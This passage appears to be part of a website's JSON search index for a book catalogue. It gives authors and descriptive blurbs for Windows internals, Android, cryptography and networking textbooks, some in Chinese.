1998) was written by David Solomon. It updated the original book to cover Windows NT 4.0 and had a greatly increased level of technical depth. Inside Windows 2000, Third Edition (Microsoft Press, 2000) was authored by David Solomon and Mark Russinovich. It added many new topics, such as startup and shutdown, service internals, registry internals, file-system drivers, and networking. It also covered kernel changes in Windows 2000, such as the Windows Driver Model (WDM), Plug and Play, power management, Windows Management Instrumentation (WMI), encryption, the job object, and Terminal Services. Windows Internals, Fourth Edition was the Windows XP and Windows Server 2003 update and added more content focused on helping IT professionals make use of their knowledge of Windows internals, such as using key tools from Windows Sysinternals and analyzing crash dumps. Windows Internals, Fifth Edition was the update for Windows Vista and Windows Server 2008. It saw Mark Russinovich move on to a full-time job at Microsoft (where he is now the Azure CTO) and the addition of a new co-author, Alex Ionescu. New content included the image loader, user-mode debugging facility, Advanced Local Procedure Call (ALPC), and Hyper-V. The next release, Windows Internals, Sixth Edition, was fully updated to address the many kernel changes in Windows 7 and Windows Server 2008 R2, with many new hands-on experiments to reflect changes in the tools as well. Seventh Edition Changes Since this series\u2019 last update, Windows has gone through several releases, coming up to Windows 10 and Windows Server 2016. Windows 10 itself, being the current going-forward name for Windows, has had several releases since its initial Release-to-Manufacturing, or RTM, each labeled with a 4-digit version number indicating year and month of release, such as Windows 10, version 1703 that was completed in March 2017. The above implies that Windows has gone through at least 6 versions since Windows 7. Starting with Windows 8, Microsoft began a process of OS convergence, which is beneficial from a development perspective as well as for the Windows engineering team itself. Windows 8 and Windows Phone 8 had converged kernels, with modern app convergence arriving in Windows 8.1 and Windows Phone 8.1. The convergence story was complete with Windows 10, which runs on desktops/laptops, servers, XBOX One, phones (Windows Mobile 10), HoloLens, and various Internet of Things (IoT) devices. With this grand unification completed, the time was right for a new edition of the series, which could now finally catch up with almost half a decade of changes, in what will now be a more stabilized kernel architecture going forward. As such, this latest book covers aspects of Windows from Windows 8 to Windows 10, version 1703. Additionally, this edition welcomes Pavel Yosifovich as its new co-author. Cover","title":"Windows Internals"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#windows-internals","text":"Author: Pavel Yosifovich (Author), Mark Russinovich (Author), David Solomon (Author), Alex Ionescu (Author)","title":"Windows Internals"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#overview","text":"This book helps you: Understand the Windows system architecture and its general components Explore internal data structures using tools like the kernel debugger Understand how Windows uses processes for management and isolation Understand and view thread scheduling and how CPU resources are managed Dig into the Windows security model including recent advances in security mitigations Understand how Windows manages virtual and physical memory Understand how the I/O system manages physical devices and device drivers The 7th edition was written by Pavel Yosifovich, Alex Ionescu, Mark Russinovich and David Solomon. New material has been added since the 6th edition (which covered Windows 7 and Windows Server 2008 R2). Since the 7th edition\u2019s part 2 is not yet available, the Windows Internals 6th edition (written by Mark Russinovich, David Solomon and Alex Ionescu) is an invaluable resource on missing topics from the first part of the 7th edition. These include system mechanisms, management mechanisms, networking, file systems, cache management and troubleshooting system crashes.","title":"Overview"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#history-of-the-book","text":"This is the seventh edition of a book that was originally called Inside Windows NT (Microsoft Press, 1992), written by Helen Custer (prior to the initial release of Microsoft Windows NT 3.1). Inside Windows NT was the first book ever published about Windows NT and provided key insights into the architecture and design of the system. Inside Windows NT, Second Edition (Microsoft Press, 1998) was written by David Solomon. It updated the original book to cover Windows NT 4.0 and had a greatly increased level of technical depth. Inside Windows 2000, Third Edition (Microsoft Press, 2000) was authored by David Solomon and Mark Russinovich. It added many new topics, such as startup and shutdown, service internals, registry internals, file-system drivers, and networking. It also covered kernel changes in Windows 2000, such as the Windows Driver Model (WDM), Plug and Play, power management, Windows Management Instrumentation (WMI), encryption, the job object, and Terminal Services. Windows Internals, Fourth Edition was the Windows XP and Windows Server 2003 update and added more content focused on helping IT professionals make use of their knowledge of Windows internals, such as using key tools from Windows Sysinternals and analyzing crash dumps. Windows Internals, Fifth Edition was the update for Windows Vista and Windows Server 2008. It saw Mark Russinovich move on to a full-time job at Microsoft (where he is now the Azure CTO) and the addition of a new co-author, Alex Ionescu. New content included the image loader, user-mode debugging facility, Advanced Local Procedure Call (ALPC), and Hyper-V. The next release, Windows Internals, Sixth Edition, was fully updated to address the many kernel changes in Windows 7 and Windows Server 2008 R2, with many new hands-on experiments to reflect changes in the tools as well.","title":"History of the Book"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#seventh-edition-changes","text":"Since this series\u2019 last update, Windows has gone through several releases, coming up to Windows 10 and Windows Server 2016. Windows 10 itself, being the current going-forward name for Windows, has had several releases since its initial Release-to-Manufacturing, or RTM, each labeled with a 4-digit version number indicating year and month of release, such as Windows 10, version 1703 that was completed in March 2017. The above implies that Windows has gone through at least 6 versions since Windows 7. Starting with Windows 8, Microsoft began a process of OS convergence, which is beneficial from a development perspective as well as for the Windows engineering team itself. Windows 8 and Windows Phone 8 had converged kernels, with modern app convergence arriving in Windows 8.1 and Windows Phone 8.1. The convergence story was complete with Windows 10, which runs on desktops/laptops, servers, XBOX One, phones (Windows Mobile 10), HoloLens, and various Internet of Things (IoT) devices. With this grand unification completed, the time was right for a new edition of the series, which could now finally catch up with almost half a decade of changes, in what will now be a more stabilized kernel architecture going forward. As such, this latest book covers aspects of Windows from Windows 8 to Windows 10, version 1703. Additionally, this edition welcomes Pavel Yosifovich as its new co-author.","title":"Seventh Edition Changes"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/%E4%BB%A3%E7%A0%81%E6%8F%AD%E7%A7%98/","text":"\u4ee3\u7801\u63ed\u79d8 Author: \u5de6\u98de Overview \u672c\u4e66\u4ece\u7a0b\u5e8f\u8bbe\u8ba1\u89d2\u5ea6\u51fa\u53d1\uff0c\u4ee5C/C++\u4e3a\u63cf\u8ff0\u8bed\u8a00\uff0c\u4ee5Visual C++\u4e3a\u5f62\u5f0f\u5de5\u5177\uff0c\u5c06\u9690\u85cf\u5728\u4ee3\u7801\u80cc\u540e\u7684\u5173\u4e8e\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\u3001\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u7b49\u65b9\u9762\u7684\u673a\u5236\u548c\u77e5\u8bc6\u5a13\u5a13\u9053\u6765\uff0c\u4e0d\u4ec5\u8ba9\u8bfb\u8005\u77e5\u5176\u7136\uff0c\u66f4\u8981\u8ba9\u8bfb\u8005\u77e5\u5176\u6240\u4ee5\u7136\u3002\u5e76\u8ba9\u8fd9\u4e9b\u77e5\u8bc6\u518d\u53cd\u4f5c\u7528\u4e8e\u7f16\u7a0b\u5b9e\u8df5\uff0c\u4ece\u800c\u5e2e\u52a9\u8bfb\u8005\u5199\u51fa\u66f4\u9002\u5408\u673a\u5668\u4f18\u5316\u7684\u9ad8\u8d28\u91cf\u4ee3\u7801\u3002\u63ed\u5f00\u4ee3\u7801\u80cc\u540e\u9c9c\u4e3a\u4eba\u77e5\u7684\u79d8\u5bc6\uff0c\u5177\u4f53\u8bf4\u6765\uff0c\u5168\u4e66\u4e3b\u8981\u8ba8\u8bba\u4e86\u5305\u62ec\u8ba1\u7b97\u673a\u5e95\u5c42\u7f16\u7801\u3001\u5185\u5b58\u4e0e\u6307\u9488\u3001\u8ba1\u7b97\u673a\u6307\u4ee4\u4e0e\u4ee3\u7801\u7cfb\u7edf\u3001\u51fd\u6570\u8c03\u7528\u7684\u673a\u5236\u3001\u591a\u7ea7\u5b58\u50a8\u7cfb\u7edf\u3001\u7ebf\u7a0b\u4e0e\u8fdb\u7a0b\u7684\u6982\u5ff5\u4ee5\u53ca\u4ee3\u7801\u4f18\u5316\u7b49\u591a\u4e2a\u65b9\u9762\u7684\u8bdd\u9898\u3002 Cover","title":"\u4ee3\u7801\u63ed\u79d8"},{"location":"Book/Computer%20and%20System/%E4%BB%A3%E7%A0%81%E6%8F%AD%E7%A7%98/#_1","text":"Author: \u5de6\u98de","title":"\u4ee3\u7801\u63ed\u79d8"},{"location":"Book/Computer%20and%20System/%E4%BB%A3%E7%A0%81%E6%8F%AD%E7%A7%98/#overview","text":"\u672c\u4e66\u4ece\u7a0b\u5e8f\u8bbe\u8ba1\u89d2\u5ea6\u51fa\u53d1\uff0c\u4ee5C/C++\u4e3a\u63cf\u8ff0\u8bed\u8a00\uff0c\u4ee5Visual C++\u4e3a\u5f62\u5f0f\u5de5\u5177\uff0c\u5c06\u9690\u85cf\u5728\u4ee3\u7801\u80cc\u540e\u7684\u5173\u4e8e\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\u3001\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u7b49\u65b9\u9762\u7684\u673a\u5236\u548c\u77e5\u8bc6\u5a13\u5a13\u9053\u6765\uff0c\u4e0d\u4ec5\u8ba9\u8bfb\u8005\u77e5\u5176\u7136\uff0c\u66f4\u8981\u8ba9\u8bfb\u8005\u77e5\u5176\u6240\u4ee5\u7136\u3002\u5e76\u8ba9\u8fd9\u4e9b\u77e5\u8bc6\u518d\u53cd\u4f5c\u7528\u4e8e\u7f16\u7a0b\u5b9e\u8df5\uff0c\u4ece\u800c\u5e2e\u52a9\u8bfb\u8005\u5199\u51fa\u66f4\u9002\u5408\u673a\u5668\u4f18\u5316\u7684\u9ad8\u8d28\u91cf\u4ee3\u7801\u3002\u63ed\u5f00\u4ee3\u7801\u80cc\u540e\u9c9c\u4e3a\u4eba\u77e5\u7684\u79d8\u5bc6\uff0c\u5177\u4f53\u8bf4\u6765\uff0c\u5168\u4e66\u4e3b\u8981\u8ba8\u8bba\u4e86\u5305\u62ec\u8ba1\u7b97\u673a\u5e95\u5c42\u7f16\u7801\u3001\u5185\u5b58\u4e0e\u6307\u9488\u3001\u8ba1\u7b97\u673a\u6307\u4ee4\u4e0e\u4ee3\u7801\u7cfb\u7edf\u3001\u51fd\u6570\u8c03\u7528\u7684\u673a\u5236\u3001\u591a\u7ea7\u5b58\u50a8\u7cfb\u7edf\u3001\u7ebf\u7a0b\u4e0e\u8fdb\u7a0b\u7684\u6982\u5ff5\u4ee5\u53ca\u4ee3\u7801\u4f18\u5316\u7b49\u591a\u4e2a\u65b9\u9762\u7684\u8bdd\u9898\u3002","title":"Overview"},{"location":"Book/Computer%20and%20System/%E4%BB%A3%E7%A0%81%E6%8F%AD%E7%A7%98/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Android%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/","text":"\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3 Author: \u6797\u5b66\u68ee Overview \u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u9002\u7528\u4e8eAndroid 4.3\u4ee5\u4e0a\u7684\u7248\u672c\u3002\u5168\u4e66\u4ece\u64cd\u4f5c\u7cfb\u7edf\u7684\u57fa\u7840\u77e5\u8bc6\u5165\u624b\uff0c\u5168\u9762\u5256\u6790\u8fdb\u7a0b/\u7ebf\u7a0b\u3001\u5185\u5b58\u7ba1\u7406\u3001Binder\u673a\u5236\u3001GUI\u663e\u793a\u7cfb\u7edf\u3001\u591a\u5a92\u4f53\u7ba1\u7406\u3001\u8f93\u5165\u7cfb\u7edf\u7b49\u6838\u5fc3\u6280\u672f\u5728Android\u4e2d\u7684\u5b9e\u73b0\u539f\u7406\u3002\u4e66\u4e2d\u8bb2\u8ff0\u7684\u77e5\u8bc6\u70b9\u5927\u90e8\u5206\u6765\u6e90\u4e8e\u5de5\u7a0b\u9879\u76ee\u7814\u53d1\uff0c\u56e0\u800c\u5177\u6709\u8f83\u5f3a\u7684\u5b9e\u7528\u6027\uff0c\u5e0c\u671b\u53ef\u4ee5\u8ba9\u8bfb\u8005\u201c\u77e5\u5176\u7136\uff0c\u66f4\u77e5\u5176\u6240\u4ee5\u7136\u201d\u3002\u5168\u4e66\u5206\u4e3a\u7f16\u8bd1\u7bc7\u3001\u7cfb\u7edf\u539f\u7406\u7bc7\u3001\u5e94\u7528\u539f\u7406\u7bc7\u3001\u7cfb\u7edf\u5de5\u5177\u7bc7\u51714\u7bc722\u7ae0\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u53c2\u4e0eAndroid\u5f00\u53d1\u6240\u9700\u5177\u5907\u7684\u77e5\u8bc6\uff0c\u5e76\u901a\u8fc7\u5927\u91cf\u56fe\u7247\u4e0e\u5b9e\u4f8b\u6765\u5f15\u5bfc\u8bfb\u8005\u5b66\u4e60\uff0c\u4ee5\u6c42\u5c3d\u91cf\u5728\u6e90\u4ee3\u7801\u5206\u6790\u5916\u4e3a\u8bfb\u8005\u63d0\u4f9b\u66f4\u6613\u4e8e\u7406\u89e3\u7684\u601d\u7ef4\u65b9\u5f0f\u3002 \u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u65e2\u9002\u5408Android\u7cfb\u7edf\u5de5\u7a0b\u5e08\uff0c\u4e5f\u9002\u5408\u4e8e\u5e94\u7528\u5f00\u53d1\u5de5\u7a0b\u5e08\u6765\u9605\u8bfb\u63d0\u5347Android\u5f00\u53d1\u80fd\u529b\u3002\u8bfb\u8005\u53ef\u4ee5\u5728\u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u6f5c\u79fb\u9ed8\u5316\u7684\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u66f4\u6df1\u523b\u5730\u7406\u89e3Android\u7cfb\u7edf\uff0c\u5e76\u5c06\u6240\u5b66\u77e5\u8bc6\u81ea\u7136\u5730\u5e94\u7528\u5230\u5b9e\u9645\u5f00\u53d1\u96be\u9898\u7684\u89e3\u51b3\u4e2d\u3002 Cover","title":"\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3"},{"location":"Book/Computer%20and%20System/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Android%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/#android","text":"Author: \u6797\u5b66\u68ee","title":"\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3"},{"location":"Book/Computer%20and%20System/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Android%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/#overview","text":"\u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u9002\u7528\u4e8eAndroid 4.3\u4ee5\u4e0a\u7684\u7248\u672c\u3002\u5168\u4e66\u4ece\u64cd\u4f5c\u7cfb\u7edf\u7684\u57fa\u7840\u77e5\u8bc6\u5165\u624b\uff0c\u5168\u9762\u5256\u6790\u8fdb\u7a0b/\u7ebf\u7a0b\u3001\u5185\u5b58\u7ba1\u7406\u3001Binder\u673a\u5236\u3001GUI\u663e\u793a\u7cfb\u7edf\u3001\u591a\u5a92\u4f53\u7ba1\u7406\u3001\u8f93\u5165\u7cfb\u7edf\u7b49\u6838\u5fc3\u6280\u672f\u5728Android\u4e2d\u7684\u5b9e\u73b0\u539f\u7406\u3002\u4e66\u4e2d\u8bb2\u8ff0\u7684\u77e5\u8bc6\u70b9\u5927\u90e8\u5206\u6765\u6e90\u4e8e\u5de5\u7a0b\u9879\u76ee\u7814\u53d1\uff0c\u56e0\u800c\u5177\u6709\u8f83\u5f3a\u7684\u5b9e\u7528\u6027\uff0c\u5e0c\u671b\u53ef\u4ee5\u8ba9\u8bfb\u8005\u201c\u77e5\u5176\u7136\uff0c\u66f4\u77e5\u5176\u6240\u4ee5\u7136\u201d\u3002\u5168\u4e66\u5206\u4e3a\u7f16\u8bd1\u7bc7\u3001\u7cfb\u7edf\u539f\u7406\u7bc7\u3001\u5e94\u7528\u539f\u7406\u7bc7\u3001\u7cfb\u7edf\u5de5\u5177\u7bc7\u51714\u7bc722\u7ae0\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u53c2\u4e0eAndroid\u5f00\u53d1\u6240\u9700\u5177\u5907\u7684\u77e5\u8bc6\uff0c\u5e76\u901a\u8fc7\u5927\u91cf\u56fe\u7247\u4e0e\u5b9e\u4f8b\u6765\u5f15\u5bfc\u8bfb\u8005\u5b66\u4e60\uff0c\u4ee5\u6c42\u5c3d\u91cf\u5728\u6e90\u4ee3\u7801\u5206\u6790\u5916\u4e3a\u8bfb\u8005\u63d0\u4f9b\u66f4\u6613\u4e8e\u7406\u89e3\u7684\u601d\u7ef4\u65b9\u5f0f\u3002 \u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u65e2\u9002\u5408Android\u7cfb\u7edf\u5de5\u7a0b\u5e08\uff0c\u4e5f\u9002\u5408\u4e8e\u5e94\u7528\u5f00\u53d1\u5de5\u7a0b\u5e08\u6765\u9605\u8bfb\u63d0\u5347Android\u5f00\u53d1\u80fd\u529b\u3002\u8bfb\u8005\u53ef\u4ee5\u5728\u300a\u6df1\u5165\u7406\u89e3Android\u5185\u6838\u8bbe\u8ba1\u601d\u60f3\u300b\u6f5c\u79fb\u9ed8\u5316\u7684\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u66f4\u6df1\u523b\u5730\u7406\u89e3Android\u7cfb\u7edf\uff0c\u5e76\u5c06\u6240\u5b66\u77e5\u8bc6\u81ea\u7136\u5730\u5e94\u7528\u5230\u5b9e\u9645\u5f00\u53d1\u96be\u9898\u7684\u89e3\u51b3\u4e2d\u3002","title":"Overview"},{"location":"Book/Computer%20and%20System/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Android%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/#cover","text":"","title":"Cover"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/","text":"Foundations of Cryptography Author: Oded Goldreich (Author) Introduction Cryptography is concerned with the conceptualization, definition and construction of computing systems that address security concerns. This book presents a rigorous and systematic treatment of the foundational issues: defining cryptographic tasks and solving new cryptographic problems using existing tools. It focuses on the basic mathematical tools: computational difficulty (one-way functions), pseudo randomness and zero-knowledge proofs. Rather than describing ad-hoc approaches, this book emphasizes the clarification of fundamental concepts and the demonstration of the feasibility of solving cryptographic problems. It is suitable for use in a graduate course on cryptography and as a reference book for experts. Cover","title":"Foundations of Cryptography"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/#foundations-of-cryptography","text":"Author: Oded Goldreich (Author)","title":"Foundations of Cryptography"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/#introduction","text":"Cryptography is concerned with the conceptualization, definition and construction of computing systems that address security concerns. This book presents a rigorous and systematic treatment of the foundational issues: defining cryptographic tasks and solving new cryptographic problems using existing tools. It focuses on the basic mathematical tools: computational difficulty (one-way functions), pseudo randomness and zero-knowledge proofs. Rather than describing ad-hoc approaches, this book emphasizes the clarification of fundamental concepts and the demonstration of the feasibility of solving cryptographic problems. It is suitable for use in a graduate course on cryptography and as a reference book for experts.","title":"Introduction"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/#cover","text":"","title":"Cover"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/","text":"Introduction to Modern Cryptography: Principles and Protocols Author: Jonathan Katz (Author), Yehuda Lindell (Author) Introduction Cryptography plays a key role in ensuring the privacy and integrity of data and the security of computer networks. Introduction to Modern Cryptography provides a rigorous yet accessible treatment of modern cryptography, with a focus on formal definitions, precise assumptions, and rigorous proofs. The authors introduce the core principles of modern cryptography, including the modern, computational approach to security that overcomes the limitations of perfect secrecy. An extensive treatment of private-key encryption and message authentication follows. The authors also illustrate design principles for block ciphers, such as the Data Encryption Standard (DES) and the Advanced Encryption Standard (AES), and present provably secure constructions of block ciphers from lower-level primitives. The second half of the book focuses on public-key cryptography, beginning with a self-contained introduction to the number theory needed to understand the RSA, Diffie-Hellman, El Gamal, and other cryptosystems. After exploring public-key encryption and digital signatures, the book concludes with a discussion of the random oracle model and its applications. Serving as a textbook, a reference, or for self-study, Introduction to Modern Cryptography presents the necessary tools to fully understand this fascinating subject. Cover","title":"Introduction to Modern Cryptography: Principles and Protocols"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#introduction-to-modern-cryptography-principles-and-protocols","text":"Author: Jonathan Katz (Author), Yehuda Lindell (Author)","title":"Introduction to Modern Cryptography: Principles and Protocols"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#introduction","text":"Cryptography plays a key role in ensuring the privacy and integrity of data and the security of computer networks. Introduction to Modern Cryptography provides a rigorous yet accessible treatment of modern cryptography, with a focus on formal definitions, precise assumptions, and rigorous proofs. The authors introduce the core principles of modern cryptography, including the modern, computational approach to security that overcomes the limitations of perfect secrecy. An extensive treatment of private-key encryption and message authentication follows. The authors also illustrate design principles for block ciphers, such as the Data Encryption Standard (DES) and the Advanced Encryption Standard (AES), and present provably secure constructions of block ciphers from lower-level primitives. The second half of the book focuses on public-key cryptography, beginning with a self-contained introduction to the number theory needed to understand the RSA, Diffie-Hellman, El Gamal, and other cryptosystems. After exploring public-key encryption and digital signatures, the book concludes with a discussion of the random oracle model and its applications. Serving as a textbook, a reference, or for self-study, Introduction to Modern Cryptography presents the necessary tools to fully understand this fascinating subject.","title":"Introduction"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#cover","text":"","title":"Cover"},{"location":"Book/Cryptography/Understanding%20Cryptography/","text":"Understanding Cryptography: A Textbook for Students and Practitioners Author: Christof Paar (Author), Jan Pelzl (Author), Bart Preneel (Foreword) Introduction Cryptography is now ubiquitous \u2013 moving beyond the traditional environments, such as government communications and banking systems, we see cryptographic techniques realized in Web browsers, e-mail programs, cell phones, manufacturing systems, embedded software, smart buildings, cars, and even medical implants. Today's designers need a comprehensive understanding of applied cryptography. After an introduction to cryptography and data security, the authors explain the main techniques in modern cryptography, with chapters addressing stream ciphers, the Data Encryption Standard (DES) and 3DES, the Advanced Encryption Standard (AES), block ciphers, the RSA cryptosystem, public-key cryptosystems based on the discrete logarithm problem, elliptic-curve cryptography (ECC), digital signatures, hash functions, Message Authentication Codes (MACs), and methods for key establishment, including certificates and public-key infrastructure (PKI). Throughout the book, the authors focus on communicating the essentials and keeping the mathematics to a minimum, and they move quickly from explaining the foundations to describing practical implementations, including recent topics such as lightweight ciphers for RFIDs and mobile devices, and current key-length recommendations. The authors have considerable experience teaching applied cryptography to engineering and computer science students and to professionals, and they make extensive use of examples, problems, and chapter reviews, while the book\u2019s website offers slides, projects and links to further resources. This is a suitable textbook for graduate and advanced undergraduate courses and also for self-study by engineers. Cover","title":"Understanding Cryptography: A Textbook for Students and Practitioners"},{"location":"Book/Cryptography/Understanding%20Cryptography/#understanding-cryptography-a-textbook-for-students-and-practitioners","text":"Author: Christof Paar (Author), Jan Pelzl (Author), Bart Preneel (Foreword)","title":"Understanding Cryptography: A Textbook for Students and Practitioners"},{"location":"Book/Cryptography/Understanding%20Cryptography/#introduction","text":"Cryptography is now ubiquitous \u2013 moving beyond the traditional environments, such as government communications and banking systems, we see cryptographic techniques realized in Web browsers, e-mail programs, cell phones, manufacturing systems, embedded software, smart buildings, cars, and even medical implants. Today's designers need a comprehensive understanding of applied cryptography. After an introduction to cryptography and data security, the authors explain the main techniques in modern cryptography, with chapters addressing stream ciphers, the Data Encryption Standard (DES) and 3DES, the Advanced Encryption Standard (AES), block ciphers, the RSA cryptosystem, public-key cryptosystems based on the discrete logarithm problem, elliptic-curve cryptography (ECC), digital signatures, hash functions, Message Authentication Codes (MACs), and methods for key establishment, including certificates and public-key infrastructure (PKI). Throughout the book, the authors focus on communicating the essentials and keeping the mathematics to a minimum, and they move quickly from explaining the foundations to describing practical implementations, including recent topics such as lightweight ciphers for RFIDs and mobile devices, and current key-length recommendations. The authors have considerable experience teaching applied cryptography to engineering and computer science students and to professionals, and they make extensive use of examples, problems, and chapter reviews, while the book\u2019s website offers slides, projects and links to further resources. This is a suitable textbook for graduate and advanced undergraduate courses and also for self-study by engineers.","title":"Introduction"},{"location":"Book/Cryptography/Understanding%20Cryptography/#cover","text":"","title":"Cover"},{"location":"Book/Cryptography/%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/","text":"\u56fe\u89e3\u5bc6\u7801\u6280\u672f Author: [\u65e5] \u7ed3\u57ce\u6d69 Introduction \u672c\u4e66\u4ee5\u56fe\u914d\u6587\u7684\u5f62\u5f0f\uff0c\u8be6\u7ec6\u8bb2\u89e3\u4e866\u79cd\u6700\u91cd\u8981\u7684\u5bc6\u7801\u6280\u672f\uff1a\u5bf9\u79f0\u5bc6\u7801\u3001\u516c\u94a5\u5bc6\u7801\u3001\u5355\u5411\u6563\u5217\u51fd\u6570\u3001\u6d88\u606f\u8ba4\u8bc1\u7801\u3001\u6570\u5b57\u7b7e\u540d\u548c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002 \u7b2c1\u90e8\u5206\u8bb2\u8ff0\u4e86\u5bc6\u7801\u6280\u672f\u7684\u5386\u53f2\u6cbf\u9769\u3001\u5bf9\u79f0\u5bc6\u7801\u3001\u5206\u7ec4\u5bc6\u7801\u6a21\u5f0f\uff08\u5305\u62ecECB\u3001CBC\u3001CFB\u3001OFB\u3001CTR\uff09\u3001\u516c\u94a5\u3001\u6df7\u5408\u5bc6\u7801\u7cfb\u7edf\u3002\u7b2c2\u90e8\u5206\u91cd\u70b9\u4ecb\u7ecd\u4e86\u8ba4\u8bc1\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u6d89\u53ca\u5355\u5411\u6563\u5217\u51fd\u6570\u3001\u6d88\u606f\u8ba4\u8bc1\u7801\u3001\u6570\u5b57\u7b7e\u540d\u3001\u8bc1\u4e66\u7b49\u3002\u7b2c3\u90e8\u5206\u8bb2\u8ff0\u4e86\u5bc6\u94a5\u3001\u968f\u673a\u6570\u3001PGP\u3001SSL/TLS \u4ee5\u53ca\u5bc6\u7801\u6280\u672f\u5728\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u5e94\u7528\u3002 Cover","title":"\u56fe\u89e3\u5bc6\u7801\u6280\u672f"},{"location":"Book/Cryptography/%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/#_1","text":"Author: [\u65e5] \u7ed3\u57ce\u6d69","title":"\u56fe\u89e3\u5bc6\u7801\u6280\u672f"},{"location":"Book/Cryptography/%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/#introduction","text":"\u672c\u4e66\u4ee5\u56fe\u914d\u6587\u7684\u5f62\u5f0f\uff0c\u8be6\u7ec6\u8bb2\u89e3\u4e866\u79cd\u6700\u91cd\u8981\u7684\u5bc6\u7801\u6280\u672f\uff1a\u5bf9\u79f0\u5bc6\u7801\u3001\u516c\u94a5\u5bc6\u7801\u3001\u5355\u5411\u6563\u5217\u51fd\u6570\u3001\u6d88\u606f\u8ba4\u8bc1\u7801\u3001\u6570\u5b57\u7b7e\u540d\u548c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002 \u7b2c1\u90e8\u5206\u8bb2\u8ff0\u4e86\u5bc6\u7801\u6280\u672f\u7684\u5386\u53f2\u6cbf\u9769\u3001\u5bf9\u79f0\u5bc6\u7801\u3001\u5206\u7ec4\u5bc6\u7801\u6a21\u5f0f\uff08\u5305\u62ecECB\u3001CBC\u3001CFB\u3001OFB\u3001CTR\uff09\u3001\u516c\u94a5\u3001\u6df7\u5408\u5bc6\u7801\u7cfb\u7edf\u3002\u7b2c2\u90e8\u5206\u91cd\u70b9\u4ecb\u7ecd\u4e86\u8ba4\u8bc1\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u6d89\u53ca\u5355\u5411\u6563\u5217\u51fd\u6570\u3001\u6d88\u606f\u8ba4\u8bc1\u7801\u3001\u6570\u5b57\u7b7e\u540d\u3001\u8bc1\u4e66\u7b49\u3002\u7b2c3\u90e8\u5206\u8bb2\u8ff0\u4e86\u5bc6\u94a5\u3001\u968f\u673a\u6570\u3001PGP\u3001SSL/TLS \u4ee5\u53ca\u5bc6\u7801\u6280\u672f\u5728\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u5e94\u7528\u3002","title":"Introduction"},{"location":"Book/Cryptography/%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/#cover","text":"","title":"Cover"},{"location":"Book/Network/Computer%20Networking/","text":"Computer Networking: A Top-Down Approach Author: James Kurose (Author), Keith Ross (Author) Overview Motivates readers with a top-down, layered approach to computer networking Unique among computer networking texts, the Seventh Edition of the popular Computer Networking: A Top Down Approach* * builds on the author\u2019s long tradition of teaching this complex subject through a layered approach in a \u201ctop-down manner.\u201d The text works its way from the application layer down toward the physical layer, motivating readers by exposing them to important concepts early in their study of networking. Focusing on the Internet and the fundamentally important issues of networking, this text provides an excellent foundation for readers interested in computer science and electrical engineering, without requiring extensive knowledge of programming or mathematics. The Seventh Edition** has been updated to reflect the most important and exciting recent advances in networking. Cover","title":"Computer Networking: A Top-Down Approach"},{"location":"Book/Network/Computer%20Networking/#computer-networking-a-top-down-approach","text":"Author: James Kurose (Author), Keith Ross (Author)","title":"Computer Networking: A Top-Down Approach"},{"location":"Book/Network/Computer%20Networking/#overview","text":"Motivates readers with a top-down, layered approach to computer networking Unique among computer networking texts, the Seventh Edition of the popular Computer Networking: A Top Down 